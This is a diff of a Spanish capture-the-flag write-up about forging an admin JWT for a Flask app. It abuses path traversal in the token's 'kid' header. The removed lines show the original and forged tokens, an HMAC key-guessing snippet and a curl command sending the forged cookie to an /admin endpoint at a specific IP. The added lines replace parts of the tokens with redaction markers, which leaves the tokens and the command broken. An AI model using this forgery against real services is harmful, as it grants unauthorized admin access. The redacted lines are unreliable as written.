@@ -45,7 +45,7 @@ La aplicación es un servidor **Flask** (Python) con las siguientes funcionalida
 Al iniciar sesión como `p0m3:123456`, se obtiene el siguiente JWT:
 
 ```
-eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQua2V5IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InAwbTMiLCJyb2xlIjoidXNlciJ9.8eCv9uImWr4VypTxicU-KvVwFceXULOX37sDB15LMn4
+SECRET_REDACTED_BY_ANTIGRAVITYa2V5IiwidHlwIjoiSldUIn0.SECRET_REDACTED_BY_ANTIGRAVITYciJ9.8eCv9uImWr4VypTxicU-KvVwFceXULOX37sDB15LMn4
 ```
 
 **Header decodificado:**
@@ -96,7 +96,7 @@ Intenté verificar si `lavidaesunacausa` era la clave del JWT original:
 import hmac
 import hashlib
 
-jwt = "eyJhbGciOiJIUzI1NiIsImtpZCI6ImRlZmF1bHQua2V5IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6InAwbTMiLCJyb2xlIjoidXNlciJ9"
+jwt = "SECRET_REDACTED_BY_ANTIGRAVITYa2V5IiwidHlwIjoiSldUIn0.SECRET_REDACTED_BY_ANTIGRAVITYciJ9"
 test_key = b'lavidaesunacausa'
 
 expected_sig = hmac.new(test_key, jwt.encode(), hashlib.sha256).digest()
@@ -197,7 +197,7 @@ print(f"JWT: {jwt_token}")
 ### JWT Generado
 
 ```
-eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vL3N0YXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.itARQeJ6FTYvwcLsNNkumTpuUH8TyC5RcQiHFoLDSRM
+SECRET_REDACTED_BY_ANTIGRAVITYYXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.SECRET_REDACTED_BY_ANTIGRAVITYbWluIn0.SECRET_REDACTED_BY_ANTIGRAVITYSRM
 ```
 
 ---
@@ -207,7 +207,7 @@ eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vL3N0YXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.
 ### Comando Final
 
 ```bash
-curl -b "jwt=eyJhbGciOiJIUzI1NiIsImtpZCI6Ii4uLi4vL3N0YXRpYy9yb2JvdHMudHh0IiwidHlwIjoiSldUIn0.eyJ1c2VybmFtZSI6ImFkbWluIiwicm9sZSI6ImFkbWluIn0.itARQeJ6FTYvwcLsNNkumTpuUH8TyC5RcQiHFoLDSRM" \
+curl -b "SECRET_REDACTED_BY_ANTIGRAVITYSECRET_REDACTED_BY_ANTIGRAVITYIn0.SECRET_REDACTED_BY_ANTIGRAVITYbWluIn0.SECRET_REDACTED_BY_ANTIGRAVITYSRM" \
     http://20.81.206.3:23115/admin
 ```
 
